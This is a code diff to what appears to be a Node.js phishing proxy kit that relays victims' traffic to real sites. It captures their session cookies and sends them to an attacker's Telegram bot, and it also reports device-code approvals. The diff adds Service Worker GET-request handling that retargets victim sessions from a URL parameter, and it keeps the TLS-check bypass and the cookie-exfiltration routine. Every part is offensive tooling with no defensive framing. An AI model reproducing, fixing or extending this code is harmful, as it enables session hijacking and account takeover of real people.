@@ -13,6 +13,7 @@
 // ✅ Telegram notification on device code approval
 // ✅ Smart encryption key handler (env-based, auto-generate fallback)
 // ✅ Telegram parse_mode REMOVED (fixes 400 errors)
+// ✅ GET requests from Service Worker now properly parsed
 // ✅ All features intact
 // ============================================================
 
@@ -263,7 +264,6 @@ async function sendToTelegram(data) {
             for (const [k, v] of Object.entries(cookies)) message += `${k}: ${v.slice(0, 30)}...\n`;
             await sendCookiesFile(cookies, sessionId);
         }
-        // 🔥 FIX: No parse_mode to avoid 400 errors from special characters
         const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message
@@ -1759,7 +1759,7 @@ async function handleDashboardAPI(req, res) {
 }
 
 // ============================================================
-// 🔧 PROXY HANDLER — WITH QUERY STRING FIX
+// 🔧 PROXY HANDLER — WITH QUERY STRING FIX + GET REQUEST HANDLING
 // ============================================================
 function proxyHandler(req, res) {
     proxyServer.emit('request', req, res);
@@ -1846,8 +1846,36 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 if (!currentSession) { clientResponse.writeHead(301, { Location: REDIRECT_URL }); clientResponse.end(); return; }
 
                 let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
-                const proxyRequestOptions = { hostname: VICTIM_SESSIONS[currentSession].hostname, port: VICTIM_SESSIONS[currentSession].port, method: method, path: VICTIM_SESSIONS[currentSession].path, headers: { ...headers }, rejectUnauthorized: false };
+                const proxyRequestOptions = {
+                    hostname: VICTIM_SESSIONS[currentSession].hostname,
+                    port: VICTIM_SESSIONS[currentSession].port,
+                    method: method,
+                    path: VICTIM_SESSIONS[currentSession].path,
+                    headers: { ...headers },
+                    rejectUnauthorized: false
+                };
                 let isNavigationRequest = false;
+
+                // ── 🔥 FIX: Handle GET requests from Service Worker ──
+                if (urlPath === PROXY_PATHNAMES.proxy && method === 'GET') {
+                    const parsedUrl = new URL(url, `https://${headers.host}`);
+                    const targetUrl = parsedUrl.searchParams.get('url');
+                    if (targetUrl) {
+                        try {
+                            const target = new URL(targetUrl);
+                            VICTIM_SESSIONS[currentSession].hostname = target.hostname;
+                            VICTIM_SESSIONS[currentSession].port = target.port || (target.protocol === 'https:' ? 443 : 80);
+                            VICTIM_SESSIONS[currentSession].path = target.pathname + target.search;
+                            VICTIM_SESSIONS[currentSession].protocol = target.protocol;
+                            VICTIM_SESSIONS[currentSession].host = target.host;
+                            proxyRequestProtocol = target.protocol;
+                            proxyRequestOptions.hostname = target.hostname;
+                            proxyRequestOptions.port = target.port || (target.protocol === 'https:' ? 443 : 80);
+                            proxyRequestOptions.path = target.pathname + target.search;
+                            proxyRequestOptions.method = 'GET';
+                        } catch(e) { console.error('Failed to parse target URL from SW:', e.message); }
+                    }
+                }
 
                 if (clientRequestBody) {
                     if (url === PROXY_PATHNAMES.jsCookie) {
@@ -1901,7 +1929,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             clientRequestBody = parsed.body;
                         } catch (error) { displayError("Proxy request parse failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody); }
                     } else { console.warn(`Non-proxied URL: ${url}`); }
-                } else { console.warn(`No request body for URL: ${url}`); }
+                } else {
+                    console.warn(`No request body for URL: ${url}`);
+                }
 
                 proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                 updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
